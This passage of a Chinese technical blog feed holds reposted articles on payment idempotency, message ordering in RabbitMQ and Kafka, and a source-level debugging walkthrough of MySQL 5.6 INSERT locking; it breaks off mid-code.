Retry）</p><p>4、无论是支付中心，还是业务应用，在接收支付结果通知时都要考虑接口幂等性，消息只处理一次，其余的忽略</p><p>5、业务应用也应做超时主动查询支付结果</p><p>对于上面说的超时主动查询可以在发起支付的时候将这些支付订单放到一张表中，用定时任务去扫</p><p>为了防止订单重复提交，可以这样处理：</p><p>1、创建订单的时候，用订单信息计算一个哈希值，判断redis中是否有key，有则不允许重复提交，没有则生成一个新key，放到redis中设置个过期时间，然后创建订单。其实就是在一段时间内不可重复相同的操作</p><p>附上微信支付最佳实践：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1362641175/640-20230824234311045.png" alt="Image"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息队列中如何保证消息的顺序性</title>
      <link href="/posts/3216271943/"/>
      <url>/posts/3216271943/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文选自：advanced-java</p><p>作者：yanglbme</p></blockquote><p><strong>问：如何保证消息的顺序性？</strong></p><h2 id="面试官心理分析"><a href="#面试官心理分析" class="headerlink" title="面试官心理分析"></a>面试官心理分析</h2><p>其实这个也是用 MQ 的时候必问的话题，第一看看你了不了解顺序这个事儿？第二看看你有没有办法保证消息是有顺序的？这是生产系统中常见的问题。</p><h2 id="面试题剖析"><a href="#面试题剖析" class="headerlink" title="面试题剖析"></a>面试题剖析</h2><p>我举个例子，我们以前做过一个 mysql <code>binlog</code> 同步的系统，压力还是非常大的，日同步数据要达到上亿，就是说数据从一个 mysql 库原封不动地同步到另一个 mysql 库里面去（mysql -&gt; mysql）。常见的一点在于说比如大数据 team，就需要同步一个 mysql 库过来，对公司的业务系统的数据做各种复杂的操作。</p><p>你在 mysql 里增删改一条数据，对应出来了增删改 3 条 <code>binlog</code> 日志，接着这三条 <code>binlog</code> 发送到 MQ 里面，再消费出来依次执行，起码得保证人家是按照顺序来的吧？不然本来是：增加、修改、删除；你楞是换了顺序给执行成删除、修改、增加，不全错了么。</p><p>本来这个数据同步过来，应该最后这个数据被删除了；结果你搞错了这个顺序，最后这个数据保留下来了，数据同步就出错了。</p><p>先看看顺序会错乱的俩场景：</p><ul><li><strong>RabbitMQ</strong>：一个 queue，多个 consumer。比如，生产者向 RabbitMQ 里发送了三条数据，顺序依次是 data1/data2/data3，压入的是 RabbitMQ 的一个内存队列。有三个消费者分别从 MQ 中消费这三条数据中的一条，结果消费者2先执行完操作，把 data2 存入数据库，然后是 data1/data3。这不明显乱了。</li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3216271943/640-20230824234215423.png" alt="Image"></p><ul><li><p><strong>Kafka</strong>：比如说我们建了一个 topic，有三个 partition。生产者在写的时候，其实可以指定一个 key，比如说我们指定了某个订单 id 作为 key，那么这个订单相关的数据，一定会被分发到同一个 partition 中去，而且这个 partition 中的数据一定是有顺序的。</p><p>消费者从 partition 中取出来数据的时候，也一定是有顺序的。到这里，顺序还是 ok 的，没有错乱。接着，我们在消费者里可能会搞<strong>多个线程来并发处理消息</strong>。因为如果消费者是单线程消费处理，而处理比较耗时的话，比如处理一条消息耗时几十 ms，那么 1 秒钟只能处理几十条消息，这吞吐量太低了。而多个线程并发跑的话，顺序可能就乱掉了。</p></li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3216271943/640-20230824234215403.png" alt="Image"></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h4><p>拆分多个 queue，每个 queue 一个 consumer，就是多一些 queue 而已，确实是麻烦点；或者就一个 queue 但是对应一个 consumer，然后这个 consumer 内部用内存队列做排队，然后分发给底层不同的 worker 来处理。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3216271943/640-20230824234215388.png" alt="Image"></p><h4 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h4><ul><li>一个 topic，一个 partition，一个 consumer，内部单线程消费，单线程吞吐量太低，一般不会用这个。</li><li>写 N 个内存 queue，具有相同 key 的数据都到同一个内存 queue；然后对于 N 个线程，每个线程分别消费一个内存 queue 即可，这样就能保证顺序性。</li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3216271943/640-20230824234215350.png" alt="Image"></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读 MySQL 源码再看 INSERT 加锁流程</title>
      <link href="/posts/3984514586/"/>
      <url>/posts/3984514586/</url>
      
        <content type="html"><![CDATA[<h1 id="读-MySQL-源码再看-INSERT-加锁流程"><a href="#读-MySQL-源码再看-INSERT-加锁流程" class="headerlink" title="读 MySQL 源码再看 INSERT 加锁流程"></a>读 MySQL 源码再看 INSERT 加锁流程</h1><p>有一个问题，我还是彻底被问蒙了。他的问题是这样的：</p><blockquote><p>加了插入意向锁后，插入数据之前，此时执行了 select…lock in share mode 语句（没有取到待插入的值），然后插入了数据，下一次再执行 select…lock in share mode（不会跟插入意向锁冲突），发现多了一条数据，于是又产生了幻读。会出现这种情况吗？</p></blockquote><p>这个问题初看上去很简单，在 RR 隔离级别下，假设要插入的记录不存在，如果先执行select…lock in share mode 语句，很显然会在记录间隙之间加上 GAP 锁，而 insert 语句首先会对记录加插入意向锁，插入意向锁和 GAP 锁冲突，所以不存在幻读；如果先执行 insert 语句后执行 select…lock in share mode 语句，由于 insert 语句在插入记录之后，会对记录加 X 锁，它会阻止 select…lock in share mode 对记录加 S 锁，所以也不存在幻读。两种情况如下所示：</p><p>先执行 INSERT 后执行 SELECT：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3984514586/640-20230824234826918.jpeg" alt="Image">先执行 SELECT 后执行 INSERT：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3984514586/640-20230824234826856.jpeg" alt="Image"></p><p>但是我们仔细想一想就会发现哪里有点不对劲，我们知道 insert 语句会先在插入间隙上加上插入意向锁，然后开始写数据，写完数据之后再对记录加上 X 记录锁（这里简化了，关于insert 语句的加锁流程，可以参考我之前写的常见 SQL 语句的加锁分析）。那么问题就来了，如果在 insert 语句加插入意向锁之后，写数据之前，执行了 select…lock in share mode语句，这个时候 GAP 锁和插入意向锁是不冲突的，查询出来的记录数为 0，然后insert 语句写数据，加 X 记录锁，因为记录锁和 GAP 锁也是不冲突的，所以 insert 成功插入了一条数据，这个时候如果事务提交，select…lock in share mode 语句再次执行查询出来的记录数就是 1，岂不是就出现了幻读？</p><p>整个流程如下所示（我们把 insert 语句的执行分成两个阶段，INSERT 1 加插入意向锁，还没写数据，INSERT 2 写数据，加记录锁）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3984514586/640-20230824234826953.jpeg" alt="Image"></p><p><strong>一、INSERT 加锁的困惑</strong></p><p>在得出上面的结论时，我也感到很惊讶。按理是不可能出现这种情况的，只可能是我对这两个语句的加锁过程还没有想明白。于是我又去复习了一遍 MySQL 官方文档，Locks Set by Different SQL Statements in InnoDB 这篇文档对各个语句的加锁有详细的描述，其中对insert 的加锁过程是这样说的（这应该是网络上介绍 MySQL 加锁机制被引用最多的文档，估计也是被误解最多的文档）：</p><blockquote><p>INSERT sets an exclusive lock on the inserted row. This lock is an index-record lock, not a next-key lock (that is, there is no gap lock) and does not prevent other sessions from inserting into the gap before the inserted row.<br>Prior to inserting the row, a type of gap lock called an insert intention gap lock is set. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6 each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.<br>If a duplicate-key error occurs, a shared lock on the duplicate index record is set. This use of a shared lock can result in deadlock should there be multiple sessions trying to insert the same row if another session already has an exclusive lock. This can occur if another session deletes the row.</p></blockquote><p>讲到了 insert 会对插入的这条记录加排他记录锁，在加记录锁之前还会加一种 GAP 锁，叫做插入意向锁，如果出现唯一键冲突，还会加一个共享记录锁。这和我之前的理解是完全一样的，那么究竟是怎么回事呢？难道 MySQL 的 RR 真的会出现幻读现象？</p><p>在 Google 上搜索了很久，并没有找到 MySQL 幻读的问题，百思不得其解之际，遂决定从 MySQL 的源码中一探究竟。</p><h2 id="二、编译-MySQL-源码"><a href="#二、编译-MySQL-源码" class="headerlink" title="二、编译 MySQL 源码"></a><strong>二、编译 MySQL 源码</strong></h2><p>编译 MySQL 的源码非常简单，但是中间也有几个坑，如果能绕过这几个坑，在本地调试 MySQL 是一件很容易的事（当然能调试源码是一回事，能看懂源码又是另一回事了）。</p><p>我的环境是 Windows 10 x64，系统上安装了 Visual Studio 2012，如果你的开发环境和我不一样，编译步骤可能也会不同。</p><p>在开始之前，首先要从官网下载 MySQL 源码：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3984514586/640-20230824234826818.jpeg" alt="Image"></p><p>这里我选择的是 5.6.40 版本，操作系统下拉列表里选 Source Code，OS Version 选择 Windows（Architecture Independent），然后就可以下载打包好的 zip 源码了。</p><p>将源码解压缩到 D:\mysql-5.6.40 目录，在编译之前，还需要再安装几个必要软件：</p><ul><li><strong>CMake</strong>：CMake 本身并不是编译工具，它是通过编写一种平台无关的 CMakeList.txt 文件来定制编译流程的，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程；</li><li><strong>Bison</strong>：MySQL 在执行 SQL 语句时，必然要对 SQL 语句进行解析，一般来说语法解析器会包含两个模块：词法分析和语法规则。词法分析和语法规则模块有两个较成熟的开源工具 Flex 和 Bison 分别用来解决这两个问题。MySQL 出于性能和灵活考虑，选择了自己完成词法解析部分，语法规则部分使用了 Bison，所以这里我们还要先安装 Bison。Bison 的默认安装路径为 C:\Program Files\GnuWin32，但是千万不要这样，一定要记得选择一个不带空格的目录，譬如 C:\GnuWin32 要不然在后面使用 Visual Studio 编译 MySQL 时会卡死；</li><li>Visual Studio：没什么好说的，Windows 环境下估计没有比它更好的开发工具了吧。</li></ul><p>安装好 CMake 和 Bison 之后，记得要把它们都加到 PATH 环境变量中。做好准备工作，我们就可以开始编译了，首先用 CMake 生成 Visual Studio 的工程文件:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1D:\mysql-5.6.40&gt; mkdir project</span><br><span class="line">2D:\mysql-5.6.40&gt; cd project</span><br><span class="line">3D:\mysql-5.6.40\project&gt; cmake -G "Visual Studio 11 2012 Win64" ..</span><br></pre></td></tr></tbody></table></figure><p>cmake 的-G 参数用于指定生成哪种类型的工程文件，这里是 Visual Studio 2012，可以直接输入 cmake -G 查看支持的工程类型。如果没问题，会在 project 目录下生成一堆文件，其中 MySQL.sln 就是我们要用的工程文件，使用 Visual Studio 打开它。</p><p>打开 MySQL.sln 文件，会在 Solution Explorer 看到 130 个项目，其中有一个叫 ALL_BUILD，这个时候如果直接编译，编译会失败，在这之前，我们还要对代码做点修改：</p><ul><li>首先是 sql\sql_locale.cc 文件，看名字就知道这个文件用于国际化与本土化，这个文件里有各个国家的语言字符，但是这个文件却是 ANSI 编码，所以要将其改成 Unicode 编码；</li><li>打开 sql\mysqld.cc 文件的第 5239 行，将 DBUG_ASSERT(0) 改成DBUG_ASSERT(1)，要不然调试时会触发断言；</li></ul><p>现在我们可以编译整个工程了，选中 ALL_BUILD 项目，Build，然后静静的等待 5 到 10 分钟，如果出现了 Build: 130 succeeded, 0 failed 这样的提示，那么恭喜，你现在可以尽情的调试 MySQL 了。</p><p>我们将 mysqld 设置为 Startup Project，然后加个命令行参数 –console，这样可以在控制台里查看打印的调试信息：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3984514586/640-20230824234826853.jpeg" alt="Image"></p><p>另外， client\Debug\mysql.exe 这个文件是对应的 MySQL 的客户端，可以直接双击运行，默认使用的用户为 ODBC@localhost，如果要以 root 用户登录，可以执行 mysql.exe -u root，不需要密码。</p><h2 id="三、调试-INSERT-加锁流程"><a href="#三、调试-INSERT-加锁流程" class="headerlink" title="三、调试 INSERT 加锁流程"></a><strong>三、调试 INSERT 加锁流程</strong></h2><p>首先我们创建一个数据库 test，然后创建一个测试表 t，主键为 id，并插入测试数据：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1use test;</span><br><span class="line">2create table t(id int NOT NULL AUTO_INCREMENT , PRIMARY KEY (id));</span><br><span class="line">3insert into t(id) values(1),(10),(20),(50);</span><br></pre></td></tr></tbody></table></figure><p>然后我们开两个客户端会话，一个会话执行 insert into t(id) value(30)，另一个会话执行select * from t where id = 30 lock in share mode。很显然，如果我们能在 insert 语句加插入意向锁之后写数据之前下个断点，再在另一个会话中执行 select 就可以模拟出这种场景了。</p><p>那么我们来找下 insert 语句是在哪加插入意向锁的。第一次看 MySQL 源码可能会有些不知所措，调着调着就会迷失在深深的调用层级中，我们看 insert 语句的调用堆栈，一开始时还比较容易理解，从 <em>mysql_parse -&gt; mysql_execute_command -&gt; mysql_insert -&gt; write_record -&gt; handler::ha_write_row -&gt; innobase::write_row -&gt; row_insert_for_mysql</em>，这里就进入 InnoDb 引擎了。</p><p>然后继续往下跟：<em>row_ins_step -&gt; row_ins -&gt; row_ins_index_entry_step -&gt; row_ins_index_entry -&gt; row_ins_clust_index_entry -&gt; row_ins_clust_index_entry_low -&gt; btr_cur_optimistic_insert -&gt; btr_cur_ins_lock_and_undo -&gt; lock_rec_insert_check_and_lock。</em></p><p>一路跟下来，都没有发现插入意向锁的踪迹，直到 lock_rec_insert_check_and_lock 这里：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> 1if (lock_rec_other_has_conflicting(</span><br><span class="line"> 2        static_cast&lt;enum lock_mode&gt;(</span><br><span class="line"> 3            LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION),</span><br><span class="line"> 4        block, next_rec_heap_no, trx)) {</span><br><span class="line"> 5</span><br><span class="line"> 6    /* Note that we may get DB_SUCCESS also here! */</span><br><span class="line"> 7    trx_mutex_enter(trx);</span><br><span class="line"> 8</span><br><span class="line"> 9    err = lock_rec_enqueue_waiting(</span><br><span class="line">10        LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION,</span><br><span class="line">11        block, next_rec_heap_no, index, thr);</span><br><span class="line">12</span><br><span class="line">13    trx_mutex_exit(trx);</span><br><span class="line">14} else {</span><br><span class="line">15    err = DB_SUCCESS;</span><br><span class="line">16}</span><br></pre></td></tr></tbody></table></figure><p>这里是检查是否有和插入意向锁冲突的其他锁，如果有冲突，就将插入意向锁加到锁等待队列中。这很显然是先执行 select … lock in share mode 语句再执行 insert 语句时的情景，插入意向锁和 GAP 冲突。但这不是我们要找的点，于是继续探索，但是可惜的是，直到 insert 执行结束，我都没有找到加插入意向锁的地方。</p><p>跟代码非常辛苦，我担心是因为我跟丢了某块的逻辑导致没看到加锁，于是我看了看加其他锁的地方，发现在 InnoDb 里行锁都是通过调 lock_rec_add_to_queue（没有锁冲突） 或者 lock_rec_enqueue_waiting（有锁冲突，需要等待其他事务释放锁） 来实现的，于是在这两个函数上下断点，执行一条 insert 语句，依然没有断下来，说明 insert 语句没有加任何锁！</p><p>到这里我突然想起之前做过的 insert 加锁的实验，执行 insert 之后，如果没有任何冲突，在show engine innodb status 命令中是看不到任何锁的，这是因为 insert 加的是隐式锁。<strong>什么是隐式锁？隐式锁的意思就是没有锁！</strong></p><p>所以，根本就不存在之前说的先加插入意向锁，再加排他记录锁的说法，在执行 insert 语句时，什么锁都不会加。这就有点意思了，如果 insert 什么锁都不加，那么如果其他事务执行select … lock in share mode，它是如何阻止其他事务加锁的呢？</p><p>答案就在于隐式锁的转换。</p><p>InnoDb 在插入记录时，是不加锁的。如果事务 A 插入记录且未提交，这时事务 B 尝试对这条记录加锁，事务 B 会先去判断记录上保存的事务 id 是否活跃，如果活跃的话，那么就帮助事务 A 去建立一个锁对象，然后自身进入等待事务 A 状态，这就是所谓的隐式锁转换为显式锁。</p><p>我们跟一下执行 select 时的流程，如果 select 需要加锁，则会走：<em>sel_set_rec_lock -&gt; lock_clust_rec_read_check_and_lock -&gt; lock_rec_convert_impl_to_expl，lock_rec_convert_impl_to_expl</em> 函数的核心代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 1impl_trx = trx_rw_is_active(trx_id, NULL);</span><br><span class="line"> 2</span><br><span class="line"> 3if (impl_trx != NULL</span><br><span class="line"> 4    &amp;&amp; !lock_rec_has_expl(LOCK_X | LOCK_REC_NOT_GAP, block,</span><br><span class="line"> 5              heap_no, impl_trx)) {</span><br><span class="line"> 6    ulint    type_mode = (LOCK_REC | LOCK_X</span><br><span class="line"> 7                 | LOCK_REC_NOT_GAP);</span><br><span class="line"> 8</span><br><span class="line"> 9    lock_rec_add_to_queue(</span><br><span class="line">10        type_mode, block, heap_no, index,</span><br><span class="line">11        impl_trx, FALSE);</span><br><span class="line">12}</span><br></pre></td></tr></tbody></table></figure><p>首先判断事务是否活跃，然后检查是否已存在排他记录锁，如果事务活跃且不存在锁，则为该事务加上排他记录锁。而本事务的锁是通过 lock_rec_convert_impl_to_expl 之后的lock_rec_lock 函数来加的。</p><p>到这里，这个问题的脉络已经很清晰了：</p><ol><li>执行 insert 语句，判断是否有和插入意向锁冲突的锁，如果有，加插入意向锁，进入锁等待；如果没有，直接写数据，不加任何锁；</li><li>执行 select … lock in share mode 语句，判断记录上是否存在活跃的事务，如果存在，则为 insert 事务创建一个排他记录锁，并将自己加入到锁等待队列；</li></ol><p>所以不存在网友所说的幻读问题。那么事情到此结束了么？并没有。</p><p>细心的你会发现，执行 insert 语句时，从判断是否有锁冲突，到写数据，这两个操作之间还是有时间差的，如果在这之间执行 select … lock in share mode 语句，由于此时记录还不存在，所以也不存在活跃事务，不会触发隐式锁转换，这条语句会返回 0 条记录，并加上 GAP 锁；而 insert 语句继续写数据，不加任何锁，在 insert 事务提交之后，select … lock in share mode 就能查到 1 条记录，这岂不是还有幻读问题吗？</p><p>为了彻底搞清楚这中间的细节，我们在 lock_rec_insert_check_and_lock 检查完锁冲突之后下个断点，然后在另一个事务中执行 select … lock in share mode，如果它能成功返回 0 条记录，加上 GAP 锁，说明就存在幻读。不过事实上，这条 SQL 语句执行的时候卡住了，并不会返回 0 条记录。从 show engine innodb status 的 TRANSACTIONS 里我们看不到任何行锁冲突的信息，但是我们从 RW-LATCH INFO 中却可以看出一些端倪：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> 15    </span><br><span class="line"> 2-------------</span><br><span class="line"> 3RW-LATCH INFO</span><br><span class="line"> 4-------------</span><br><span class="line"> 5RW-LOCK: 000002C97F62FC70</span><br><span class="line"> 6Locked: thread 10304 file D:\mysql-5.6.40\storage\innobase\btr\btr0cur.cc line 879  S-LOCK</span><br><span class="line"> 7RW-LOCK: 000002C976A3B998</span><br><span class="line"> 8Locked: thread 10304 file D:\mysql-5.6.40\storage\innobase\btr\btr0cur.cc line 256  S-LOCK</span><br><span class="line"> 9Locked: thread 10304 file d:\mysql-5.6.40\storage\innobase\include\btr0pcur.ic line 518  S-LOCK</span><br><span class="line">10Locked: thread 2820 file D:\mysql-5.6.40\storage\innobase\btr\btr0cur.cc line 256  S-LOCK</span><br><span class="line">11Locked: thread 2820 file D:\mysql-5.6.40\storage\innobase\row\row0ins.cc line 2339  S-LOCK</span><br><span class="line">12RW-LOCK: 000002C976A3B8A8  Waiters for the lock exist</span><br><span class="line">13Locked: thread 2820 file D:\mysql-5.6.40\storage\innobase\btr\btr0cur.cc line 256  X-LOCK</span><br><span class="line">14Total number of rw-locks 16434</span><br><span class="line">15OS WAIT ARRAY INFO: reservation count 10</span><br><span class="line">16--Thread 10304 has waited at btr0cur.cc line 256 for 26.00 seconds the semaphore:</span><br><span class="line">17S-lock on RW-latch at 000002C976A3B8A8 created in file buf0buf.cc line 1069</span><br><span class="line">18a writer (thread id 2820) has reserved it in mode  exclusive</span><br><span class="line">19number of readers 0, waiters flag 1, lock_word: 0</span><br><span class="line">20Last time read locked in file btr0cur.cc line 256</span><br><span class="line">21Last time write locked in file D:\mysql-5.6.40\storage\innobase\btr\btr0cur.cc line 256</span><br><span class="line">22OS WAIT ARRAY INFO: signal count 8</span><br><span class="line">23Mutex spin waits 44, rounds 336, OS waits 7</span><br><span class="line">24RW-shared spins 3, rounds 90, OS waits 3</span><br><span class="line">25RW-excl spins 0, rounds 0, OS waits 0</span><br><span class="line">26Spin rounds per wait: 7.64 mutex, 30.00 RW-shared, 0.00 RW-excl</span><br><span class="line">27</span><br></pre></td></tr></tbody></table></figure><p>这里列出了 3 个 RW-LOCK：000002C97F62FC70、000002C976A3B998、000002C976A3B8A8。其中可以看到最后一个 RW-LOCK 有其他线程在等待其释放（Waiters for the lock exist）。下面列出了所有等待该锁的线程，Thread 10304 has waited at btr0cur.cc line 256 for 26.00 seconds the semaphore，这里的 Thread 10304 就是我们正在执行 select 语句的线程，它卡在了 btr0cur.cc 的 256 行，我们查看 Thread 10304 的堆栈：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3984514586/640-20230824234826932.jpeg" alt="Image"></p><p>btr0cur.cc 的 256 行位于 btr_cur_latch_leaves 函数，如下所示，通过 btr_block_get 来加锁，看起来像是在访问 InnoDb B+ 树的叶子节点时卡住了：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1case BTR_MODIFY_LEAF:</span><br><span class="line">2    mode = latch_mode == BTR_SEARCH_LEAF ? RW_S_LATCH : RW_X_LATCH;</span><br><span class="line">3    get_block = btr_block_get(</span><br><span class="line">4        space, zip_size, page_no, mode, cursor-&gt;index, mtr);</span><br></pre></td></tr></tbody></table></figure><p>这里latch_mode==BTR_SEARCH_LEAF，所以加锁的mode为 RW_S_LATCH。</p><p>这里要介绍一个新的概念，叫做 <strong>Latch</strong>，一般也把它翻译成 “锁”，但它和我们之前接触的行锁表锁（<strong>Lock</strong>）是有区别的。这是一种轻量级的锁，锁定时间一般非常短，它是用来保证并发线程可以安全的操作临界资源，通常没有死锁检测机制。Latch 可以分为两种：MUTEX（互斥量）和 RW-LOCK（读写锁），很显然，这里我们看到的是 RW-LOCK。</p><p>我们回溯一下 select 语句的调用堆栈：<em>ha_innobase::index_read -&gt; row_search_for_mysql -&gt; btr_pcur_open_at_index_side -&gt; btr_cur_latch_leaves</em>，从调用堆栈可以看出 select … lock in share mode 语句在访问索引，那么为什么访问索引会被卡住呢？</p><p>接下来我们看看这个 RW-LOCK 是在哪里加上的？从日志里可以看到 Locked: thread 2820 file D:\mysql-5.6.40\storage\innobase\btr\btr0cur.cc line 256 X-LOCK，所以这个锁是线程 2820 加上的，加锁的位置也在 btr0cur.cc 的 256 行，查看函数引用，很快我们就查到这个锁是在执行 insert 时加上的，函数堆栈为：<em>row_ins_clust_index_entry_low -&gt; btr_cur_search_to_nth_level -&gt; btr_cur_latch_leaves</em>。</p><p>我们看这里的 row_ins_clust_index_entry_low 函数（无关代码已省略）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> 1UNIV_INTERN</span><br><span class="line"> 2dberr_t</span><br><span class="line"> 3row_ins_clust_index_entry_low(</span><br><span class="line"> 4/*==========================*/</span><br><span class="line"> 5    ulint        flags,    /*!&lt; in: undo logging and locking flags */</span><br><span class="line"> 6    ulint        mode,    /*!&lt; in: BTR_MODIFY_LEAF or BTR_MODIFY_TREE,</span><br><span class="line"> 7                depending on whether we wish optimistic or</span><br><span class="line"> 8                pessimistic descent down the index tree */</span><br><span class="line"> 9    dict_index_t*    index,    /*!&lt; in: clustered index */</span><br><span class="line">10    ulint        n_uniq,    /*!&lt; in: 0 or index-&gt;n_uniq */</span><br><span class="line">11    dtuple_t*    entry,    /*!&lt; in/out: index entry to insert */</span><br><span class="line">12    ulint        n_ext,    /*!&lt; in: number of externally stored columns */</span><br><span class="line">13    que_thr_t*    thr)    /*!&lt; in: query thread */</span><br><span class="line">14{</span><br><span class="line">15    /* 开启一个 mini-transaction */</span><br><span class="line">16    mtr_start(&amp;mtr);</span><br><span class="line">17</span><br><span class="line">18    /* 调用 btr_cur_latch_leaves -&gt; btr_block_get 加 RW_X_LATCH */</span><br><span class="line">19    btr_cur_search_to_nth_level(index, 0, entry, PAGE_CUR_LE, mode,</span><br><span class="line">20                    &amp;cursor, 0, __FILE__, __LINE__, &amp;mtr);</span><br><span class="line">21</span><br><span class="line">22    if (mode != BTR_MODIFY_TREE) {</span><br><span class="line">23        /* 不需要修改 BTR_TREE，乐观插入 */</span><br><span class="line">24        err = btr_cur_optimistic_insert(</span><br><span class="line">25            flags, &amp;cursor, &amp;offsets, &amp;offsets_heap,</span><br><span class="line">26            entry, &amp;insert_rec, &amp;big_rec,</span><br><span class="line">27            n_ext, thr, &amp;mtr);</span><br><span class="line">28    } else {</span><br><span class="line">29        /* 需要修改 BTR_TREE，先乐观插入，乐观插入失败则进行悲观插入 */</span><br><span class="line">30        err = btr_cur_optimistic_insert(</span><br><span class="line">31            flags, &amp;cursor,</span><br><span class="line">32            &amp;offsets, &amp;offsets_heap,</span><br><span class="line">33            entry, &amp;insert_rec, &amp;big_rec,</span><br><span class="line">34            n_ext, thr, &amp;mtr);</span><br><span class="line">35        if (err == DB_FAIL) {</span><br><span class="line">36            err = btr_cur_pessimistic_insert(</span><br><span class="line">37                flags, &amp;cursor,</span><br><span class="line">38                &amp;offsets, &amp;offsets_heap,</span><br><span class="line">39                entry, &amp;insert_rec, 